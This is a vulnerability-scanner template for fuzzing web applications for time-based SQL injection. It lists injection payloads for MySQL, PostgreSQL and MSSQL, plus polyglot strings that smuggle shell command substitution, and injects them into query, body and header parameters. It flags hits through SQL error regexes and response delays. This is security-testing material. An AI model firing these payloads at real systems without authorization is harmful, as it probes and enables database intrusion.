id: sqli-time-based-fuzz
type: fuzz
level: 4
info:
  name: SQL Injection Time Based Fuzzer
  risk: High
payloads:
  - >-
    SLEEP(1) /*‘ or SLEEP(1) or ‘“ or SLEEP(1) or “*/
  - >-
    SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/
  - >-
    IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),​SLEEP(1)))OR\"*/
  - >-
    \"XOR(if(now()=sysdate(),sleep(9),0))XOR\"
  - >-
    0'XOR(if(now()=sysdate(),sleep(9),0))XOR'Z
  - >-
    /*$(sleep 5)`sleep 5``*/-sleep(5)#'/*$(sleep 5)`sleep 5` #*/||sleep(5)||'\"||sleep(5)||\"`
  - >-
    /*$(sleep 5)`sleep 5``*/sleep(5)#'/*$(sleep 5)`sleep 5` #*/||sleep(5)||'\"||sleep(9)||\"`
  - >-
    '\" or pg_sleep(9)/*
  - >-
    ';waitfor delay '0:0:9'--

requests:
  - generators:
      - Query("[[.original]]{{.payload}}")
      - Body("[[.original]]{{.payload}}")
      - Header("[[.original]]{{.payload}}")
    detections:
      - >-
       RegexSearch("response", "mysql_fetch_|not a valid MySQL|not a legal PLSQL identifer|mysql_connect\(\)|(SELECT\s+[^:>]+\sFROM\s+[^:>]+\sWHERE\s+)|(at\s[[:alnum:]\/\._]+\sline\s\d+)|ociparse\(\):|must be a syntactically valid variable|CFSQLTYPE|Unknown column '|Microsoft OLE DB Provider for SQL|SQL QUERY FAILURE:|Syntax error.{1,50}in query|You have an error in your SQL syntax|Unclosed quotation mark") || ResponseTime() > 8